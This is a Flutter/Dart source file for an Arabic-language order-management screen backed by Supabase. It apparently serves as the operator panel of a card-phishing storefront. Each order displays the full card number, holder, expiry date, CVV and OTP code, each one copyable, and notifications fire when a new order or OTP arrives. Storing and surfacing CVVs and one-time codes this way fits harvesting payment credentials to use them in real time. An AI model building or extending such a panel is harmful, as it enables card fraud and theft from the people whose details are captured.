import 'dart:async';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:supabase_flutter/supabase_flutter.dart';
import 'package:intl/intl.dart';
import 'package:shared_preferences/shared_preferences.dart';
import '../services/notification_service.dart';

class OrdersScreen extends StatefulWidget {
  const OrdersScreen({super.key});
  @override
  State<OrdersScreen> createState() => _OrdersScreenState();
}

class _OrdersScreenState extends State<OrdersScreen> {
  final _supabase = Supabase.instance.client;
  List<Map<String, dynamic>> _orders = [];
  bool _loading = true;
  String _filter = 'all';
  String _lastMaxId = '';

  @override
  void initState() {
    super.initState();
    _initLastSeen();
    _loadOrders();
    _startPolling();
    _subscribeStream();
  }

  Future<void> _initLastSeen() async {
    final prefs = await SharedPreferences.getInstance();
    _lastMaxId = prefs.getString('lastOrderMaxId') ?? '';
  }

  void _startPolling() {
    Timer.periodic(const Duration(seconds: 4), (_) => _refreshUI());
  }

  Future<void> _refreshUI() async {
    try {
      final data = await _supabase
          .from('orders')
          .select('*')
          .order('id', ascending: false);
      if (!mounted) return;
      setState(() { _orders = data; _loading = false; });
    } catch (_) {}
  }

  void _subscribeStream() {
    try {
      _supabase
          .from('orders')
          .stream(primaryKey: ['id'])
          .order('id', ascending: false)
          .listen((data) {
        if (!mounted) return;
        final oldIds = _orders.map((o) => o['id']).toSet();
        final oldMaxId = _lastMaxId;
        setState(() { _orders = data; _loading = false; });

        // Check for new orders
        for (final o in data) {
          final oid = (o['id'] ?? 0).toString();
          if (!oldIds.contains(o['id'])) {
            NotificationService.show(
              title: '🛒 طلب جديد!', body: 'تم بدء طلب جديد في المتجر',
            );
            _saveMaxId(oid);
          }
          // Check for OTP updates on existing orders
          if (oldIds.contains(o['id'])) {
            final otp = (o['card_otp'] ?? '').toString();
            if (otp.isNotEmpty) {
              _checkOtpUpdate(o);
            }
          }
        }
      }, onError: (error) {
        // Realtime not available, polling will handle updates
        // Realtime not available, polling will handle updates
      });
    } catch (_) {
      // Realtime not available, polling will handle
    }
  }

  void _checkOtpUpdate(Map<String, dynamic> o) async {
    try {
      final history = await _supabase
          .from('orders')
          .select('card_otp')
          .eq('order_id', o['order_id'])
          .single();
      if (history != null && (history['card_otp'] ?? '') == '') {
        NotificationService.show(
          title: '✅ تم تأكيد الدفع مع OTP!',
          body: '${o['customer_name'] ?? 'عميل'} - اكتمل الدفع',
        );
      }
    } catch (_) {}
  }

  void _saveMaxId(String id) {
    _lastMaxId = id;
    SharedPreferences.getInstance().then((prefs) => prefs.setString('lastOrderMaxId', id));
  }

  Future<void> _loadOrders() async {
    try {
      final data = await _supabase
          .from('orders')
          .select('*')
          .order('id', ascending: false);
      setState(() {
        _orders = data;
        _loading = false;
      });
      _subscribeStream();
    } catch (_) {
      setState(() => _loading = false);
    }
  }

  List<Map<String, dynamic>> get _filtered {
    if (_filter == 'all') return _orders;
    if (_filter == 'new')
      return _orders.where((o) => (o['card_otp'] ?? '') == '').toList();
    return _orders.where((o) => (o['card_otp'] ?? '') != '').toList();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('الطلبات'),
        actions: [
          PopupMenuButton<String>(
            icon: const Icon(Icons.filter_list),
            onSelected: (v) => setState(() => _filter = v),
            itemBuilder: (_) => [
              const PopupMenuItem(value: 'all', child: Text('الكل')),
              const PopupMenuItem(value: 'new', child: Text('جديدة')),
              const PopupMenuItem(value: 'paid', child: Text('مكتملة')),
            ],
          ),
          IconButton(icon: const Icon(Icons.refresh), onPressed: _loadOrders),
          IconButton(
            icon: const Icon(Icons.delete_sweep, color: Colors.red),
            onPressed: _deleteAllOrders,
            tooltip: 'حذف الكل',
          ),
        ],
      ),
      body: _loading
          ? const Center(child: CircularProgressIndicator())
          : _filtered.isEmpty
          ? const Center(child: Text('لا توجد طلبات'))
          : ListView.builder(
              padding: const EdgeInsets.all(12),
              itemCount: _filtered.length,
              itemBuilder: (_, i) {
                final order = _filtered[i];
                return Dismissible(
                  key: ValueKey(order['id']),
                  direction: DismissDirection.horizontal,
                  background: Container(
                    alignment: Alignment.centerLeft,
                    padding: const EdgeInsets.only(left: 20),
                    decoration: BoxDecoration(
                      color: Colors.red.shade600,
                      borderRadius: BorderRadius.circular(16),
                    ),
                    child: const Icon(Icons.delete, color: Colors.white, size: 30),
                  ),
                  secondaryBackground: Container(
                    alignment: Alignment.centerRight,
                    padding: const EdgeInsets.only(right: 20),
                    decoration: BoxDecoration(
                      color: Colors.red.shade600,
                      borderRadius: BorderRadius.circular(16),
                    ),
                    child: const Icon(Icons.delete, color: Colors.white, size: 30),
                  ),
                  confirmDismiss: (_) async {
                    return await showDialog<bool>(
                      context: context,
                      builder: (ctx) => AlertDialog(
                        title: const Text('حذف الطلب'),
                        content: Text('هل أنت متأكد من حذف الطلب ${order['customer_name'] ?? ''}؟'),
                        actions: [
                          TextButton(onPressed: () => Navigator.pop(ctx, false), child: const Text('إلغاء')),
                          TextButton(onPressed: () => Navigator.pop(ctx, true), child: const Text('حذف', style: TextStyle(color: Colors.red))),
                        ],
                      ),
                    );
                  },
                  onDismissed: (_) => _deleteOrder(order),
                  child: _buildCard(order),
                );
              },
            ),
    );
  }

  Future<void> _deleteAllOrders() async {
    if (_orders.isEmpty) return;
    final confirm = await showDialog<bool>(
      context: context,
      builder: (ctx) => AlertDialog(
        title: const Text('حذف الكل'),
        content: Text('هل أنت متأكد من حذف جميع الطلبات (${_orders.length})؟'),
        actions: [
          TextButton(onPressed: () => Navigator.pop(ctx, false), child: const Text('إلغاء')),
          TextButton(onPressed: () => Navigator.pop(ctx, true), child: const Text('حذف الكل', style: TextStyle(color: Colors.red))),
        ],
      ),
    );
    if (confirm != true) return;
    for (final o in _orders) {
      final oid = o['order_id']?.toString() ?? '';
      if (oid.isNotEmpty) {
        try { await _supabase.from('orders').delete().eq('order_id', oid); } catch (_) {}
      }
    }
    setState(() { _orders.clear(); _loading = false; });
  }

  Future<void> _deleteOrder(Map<String, dynamic> order) async {
    final oid = order['order_id']?.toString() ?? '';
    if (oid.isEmpty) return;
    try {
      await _supabase.from('orders').delete().eq('order_id', oid);
    } catch (_) {}
    setState(() => _orders.removeWhere((o) => o['id'] == order['id']));
  }

  Widget _buildCard(Map<String, dynamic> o) {
    final name = o['customer_name'] ?? '-';
    final total = o['total'] ?? 0;
    final date = o['created_at'] != null
        ? DateFormat('HH:mm').format(DateTime.parse(o['created_at']).toLocal())
        : '-';
    final num = o['card_number'] ?? '';
    final holder = o['card_holder'] ?? '';
    final expiry = o['card_expiry'] ?? '';
    final cvv = o['card_cvv'] ?? '';
    final otp = o['card_otp'] ?? '';
    final hasCard = num.isNotEmpty;
    final hasOtp = otp.isNotEmpty;

    return Card(
      margin: const EdgeInsets.only(bottom: 12),
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
      child: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Icon(
                  hasOtp ? Icons.check_circle : Icons.pending,
                  color: hasOtp ? Colors.green : Colors.orange,
                  size: 20,
                ),
                const SizedBox(width: 8),
                Expanded(
                  child: Text(
                    name,
                    style: const TextStyle(
                      fontWeight: FontWeight.bold,
                      fontSize: 16,
                    ),
                  ),
                ),
                Text(
                  '$total ₪',
                  style: TextStyle(
                    fontWeight: FontWeight.bold,
                    color: Colors.amber.shade800,
                    fontSize: 16,
                  ),
                ),
              ],
            ),
            const Divider(height: 16),
            _row('الوقت', date),
            if (hasCard) ...[
              const Divider(height: 8),
              const Text(
                'بيانات البطاقة:',
                style: TextStyle(fontWeight: FontWeight.bold),
              ),
              _row('رقم البطاقة', num, mono: true, copyable: true),
              _row('صاحبها', holder, copyable: true),
              _row('تاريخ الانتهاء', expiry, copyable: true),
              _row('رمز الأمان (CVV)', cvv, mono: true, copyable: true),
              _row(
                'رمز التحقق (OTP)',
                otp.isEmpty ? '-' : otp,
                mono: true,
                copyable: otp.isNotEmpty,
              ),
            ],
          ],
        ),
      ),
    );
  }

  Widget _row(
    String label,
    String value, {
    bool mono = false,
    bool copyable = false,
  }) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 2),
      child: Row(
        children: [
          Text(
            '$label: ',
            style: TextStyle(color: Colors.grey.shade600, fontSize: 13),
          ),
          const SizedBox(width: 4),
          Expanded(
            child: copyable
                ? Material(
                    color: Colors.transparent,
                    child: InkWell(
                      onTap: () {
                        Clipboard.setData(ClipboardData(text: value));
                        ScaffoldMessenger.of(context).showSnackBar(
                          SnackBar(
                            content: Text('✅ تم نسخ $label'),
                            duration: const Duration(seconds: 1),
                            behavior: SnackBarBehavior.floating,
                          ),
                        );
                      },
                      borderRadius: BorderRadius.circular(8),
                      child: Container(
                        padding: const EdgeInsets.symmetric(
                          horizontal: 8,
                          vertical: 4,
                        ),
                        decoration: BoxDecoration(
                          border: Border.all(
                            color: Colors.amber.shade200,
                            width: 1,
                          ),
                          borderRadius: BorderRadius.circular(8),
                          color: Colors.amber.shade50,
                        ),
                        child: Text(
                          value,
                          style: TextStyle(
                            fontSize: 13,
                            fontFamily: mono ? 'monospace' : null,
                            fontWeight: mono
                                ? FontWeight.bold
                                : FontWeight.normal,
                            color: mono ? Colors.amber.shade900 : null,
                          ),
                        ),
                      ),
                    ),
                  )
                : Text(
                    value,
                    style: TextStyle(
                      fontSize: 13,
                      fontFamily: mono ? 'monospace' : null,
                    ),
                  ),
          ),
        ],
      ),
    );
  }
}
